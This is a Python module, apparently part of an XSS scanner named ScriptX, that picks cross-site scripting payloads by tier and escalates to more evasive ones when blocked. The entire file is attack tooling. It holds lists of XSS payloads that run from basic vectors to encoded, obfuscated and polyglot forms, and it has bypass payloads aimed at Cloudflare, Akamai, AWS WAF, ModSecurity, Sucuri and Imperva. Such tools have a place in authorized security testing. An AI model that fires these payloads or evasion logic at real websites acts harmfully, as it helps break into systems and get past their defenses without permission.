"""
ScriptX Smart Payload Engine
Intelligent payload selection with WAF-aware escalation
"""

import random
from typing import List, Optional, Dict, Set
from dataclasses import dataclass, field
from enum import Enum

from utils.waf_detector import WAFType, WAFDetector, waf_detector
from utils.logger import logger


class PayloadTier(Enum):
    """Payload complexity tiers"""
    MINIMAL = 1      # Smallest, least likely to trigger WAF
    BASIC = 2        # Standard payloads
    ENCODED = 3      # Encoded payloads
    WAF_BYPASS = 4   # WAF-specific bypasses
    STEALTH = 5      # Heavy obfuscation
    NUCLEAR = 6      # Everything including polyglots


@dataclass
class SmartPayloadState:
    """Track payload testing state per parameter"""
    parameter: str
    current_tier: PayloadTier = PayloadTier.MINIMAL
    blocked_count: int = 0
    success_count: int = 0
    tested_payloads: Set[str] = field(default_factory=set)
    

class SmartPayloadEngine:
    """
    Intelligent payload selection that:
    1. Starts with minimal payloads
    2. Escalates to more complex payloads if blocked
    3. Uses WAF-specific payloads when WAF is detected
    4. Tracks success/failure per parameter
    """
    
    # Minimal payloads - shortest, least suspicious
    MINIMAL_PAYLOADS = [
        "'-'",
        '"-"',
        "{{7*7}}",
        "${7*7}",
        "<>",
        "'\"><",
        "-->'",
        "*/",
    ]
    
    # Basic payloads - common XSS vectors
    BASIC_PAYLOADS = [
        '<script>alert({marker})</script>',
        '<img src=x onerror=alert({marker})>',
        '<svg onload=alert({marker})>',
        '" onmouseover="alert({marker})"',
        "' onclick='alert({marker})'",
    ]
    
    # Encoded payloads
    ENCODED_PAYLOADS = [
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;({marker})>',
        '<svg onload=\\u0061lert({marker})>',
        '<a href="javascript:alert({marker})">x</a>',
        '<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>',
    ]
    
    # WAF bypass payloads
    WAF_BYPASS_PAYLOADS = [
        '<svg/onload=alert({marker})>',
        '<body/onload=alert({marker})>',
        '<img src=x onerror=window["al"+"ert"]({marker})>',
        '<svg><animate onbegin=alert({marker}) attributeName=x>',
        '<details open ontoggle=alert({marker})>',
    ]
    
    # Stealth payloads - heavy obfuscation
    STEALTH_PAYLOADS = [
        '<img src=x onerror=Function(`al\\x65rt({marker})`)()>',
        '<svg onload=[1].map(Function`al\\x65rt({marker})`)>',
        '<img src=x onerror=setTimeout`al\\x65rt({marker})`>',
        '<svg onload=location=`javas`+`cript:al`+`ert({marker})`>',
        '<img src=x onerror=Reflect.construct(Function,["ale"+"rt({marker})"])()>',
    ]
    
    # Nuclear payloads - polyglots and everything
    NUCLEAR_PAYLOADS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert({marker}) )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert({marker})//>\\x3e",
        "'\"--></noscript></title></textarea></style></template></noembed></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({marker})//'>"
    ]
    
    def __init__(self, payload_engine=None):
        """
        Args:
            payload_engine: Optional PayloadEngine instance for full payload list
        """
        self.payload_engine = payload_engine
        self.param_states: Dict[str, SmartPayloadState] = {}
        self.detected_waf: Optional[WAFType] = None
        self._marker_counter = 0
        
    def _get_marker(self) -> str:
        """Generate unique marker"""
        self._marker_counter += 1
        return f"SMART_{self._marker_counter}"
    
    def set_waf_type(self, waf_type: WAFType):
        """Set detected WAF type for targeted payload selection"""
        self.detected_waf = waf_type
        logger.info(f"Smart engine targeting: {waf_type.value}")
    
    def report_blocked(self, parameter: str):
        """Report that a payload was blocked for a parameter"""
        if parameter not in self.param_states:
            self.param_states[parameter] = SmartPayloadState(parameter=parameter)
        
        state = self.param_states[parameter]
        state.blocked_count += 1
        
        # Escalate tier if too many blocks
        if state.blocked_count >= 3 and state.current_tier.value < PayloadTier.NUCLEAR.value:
            old_tier = state.current_tier
            state.current_tier = PayloadTier(state.current_tier.value + 1)
            state.blocked_count = 0
            logger.debug(f"Escalating {parameter}: {old_tier.name} → {state.current_tier.name}")
    
    def report_success(self, parameter: str):
        """Report that a payload succeeded for a parameter"""
        if parameter not in self.param_states:
            self.param_states[parameter] = SmartPayloadState(parameter=parameter)
        
        self.param_states[parameter].success_count += 1
    
    def get_payloads_for_tier(self, tier: PayloadTier) -> List[str]:
        """Get payloads for a specific tier"""
        tier_map = {
            PayloadTier.MINIMAL: self.MINIMAL_PAYLOADS,
            PayloadTier.BASIC: self.BASIC_PAYLOADS,
            PayloadTier.ENCODED: self.ENCODED_PAYLOADS,
            PayloadTier.WAF_BYPASS: self.WAF_BYPASS_PAYLOADS,
            PayloadTier.STEALTH: self.STEALTH_PAYLOADS,
            PayloadTier.NUCLEAR: self.NUCLEAR_PAYLOADS,
        }
        
        payloads = tier_map.get(tier, self.BASIC_PAYLOADS)
        
        # Replace markers
        return [p.replace("{marker}", self._get_marker()) for p in payloads]
    
    def get_smart_payloads(self, 
                           parameter: str, 
                           max_payloads: int = 10,
                           include_lower_tiers: bool = True) -> List[str]:
        """
        Get smart payload selection for a parameter.
        
        Args:
            parameter: Parameter name being tested
            max_payloads: Maximum number of payloads to return
            include_lower_tiers: Include payloads from lower tiers
            
        Returns:
            List of payloads optimized for current state
        """
        if parameter not in self.param_states:
            self.param_states[parameter] = SmartPayloadState(parameter=parameter)
        
        state = self.param_states[parameter]
        payloads = []
        
        # If WAF detected, prioritize WAF-specific payloads
        if self.detected_waf and self.detected_waf != WAFType.UNKNOWN:
            payloads.extend(self._get_waf_specific_payloads())
        
        # Get payloads for current tier
        current_payloads = self.get_payloads_for_tier(state.current_tier)
        payloads.extend(current_payloads)
        
        # Optionally include lower tiers
        if include_lower_tiers and state.current_tier.value > PayloadTier.MINIMAL.value:
            for tier_value in range(1, state.current_tier.value):
                tier = PayloadTier(tier_value)
                tier_payloads = self.get_payloads_for_tier(tier)
                # Only add payloads not already tested
                for p in tier_payloads:
                    if p not in state.tested_payloads:
                        payloads.append(p)
        
        # Remove duplicates and already tested
        unique_payloads = []
        seen = set()
        for p in payloads:
            if p not in seen and p not in state.tested_payloads:
                seen.add(p)
                unique_payloads.append(p)
        
        # Mark as tested
        for p in unique_payloads[:max_payloads]:
            state.tested_payloads.add(p)
        
        return unique_payloads[:max_payloads]
    
    def _get_waf_specific_payloads(self) -> List[str]:
        """Get payloads specific to detected WAF"""
        waf_payloads = {
            WAFType.CLOUDFLARE: [
                '<svg onload=alert&#x28;{marker}&#x29;>',
                '<a href="javascript&colon;alert({marker})">x</a>',
                '<form><button formaction=javascript:alert({marker})>X</button>',
            ],
            WAFType.AKAMAI: [
                '<svg/onload=\\u0061lert({marker})>',
                '<x contenteditable onblur=alert({marker})>x',
                '<marquee onstart=alert({marker})>',
            ],
            WAFType.AWS_WAF: [
                '<img src=x onerror=alert({marker})//a>',
                '<svg onload=prompt({marker})//a>',
                '<body onpageshow=alert({marker})>',
            ],
            WAFType.MODSECURITY: [
                '<object data="javascript:alert({marker})">',
                '<embed code="javascript:alert({marker})">',
                '<base href="javascript:alert({marker})//">',
            ],
            WAFType.SUCURI: [
                '<svg><set onbegin=alert({marker}) attributename=x>',
                '<svg/onload=eval(atob`YWxlcnQoMSk=`)>',
            ],
            WAFType.IMPERVA: [
                '<keygen autofocus onfocus=alert({marker})>',
                '<video><source onerror=alert({marker})>',
            ],
        }
        
        payloads = waf_payloads.get(self.detected_waf, [])
        return [p.replace("{marker}", self._get_marker()) for p in payloads]
    
    def get_escalation_summary(self) -> Dict:
        """Get summary of escalation state for all parameters"""
        summary = {}
        for param, state in self.param_states.items():
            summary[param] = {
                "tier": state.current_tier.name,
                "blocked": state.blocked_count,
                "success": state.success_count,
                "tested": len(state.tested_payloads),
            }
        return summary


# Singleton instance
smart_engine = SmartPayloadEngine()
